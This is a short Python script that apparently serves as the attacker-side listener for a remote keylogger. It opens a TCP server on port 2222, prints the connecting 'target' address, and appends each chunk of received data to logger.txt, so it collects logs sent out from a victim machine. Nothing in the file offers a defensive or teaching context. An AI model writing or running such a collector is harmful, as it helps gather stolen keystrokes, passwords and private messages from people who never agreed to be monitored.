import socket as s

sock = s.socket(s.AF_INET,s.SOCK_STREAM)
sock.bind(('',2222))
sock.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR,1)
sock.listen()
con,addr = sock.accept()
print('target ',addr[0])

while True:
    getlogs = con.recv(1024).decode()
    
    with open('logger.txt','a') as log:
        log.write(getlogs)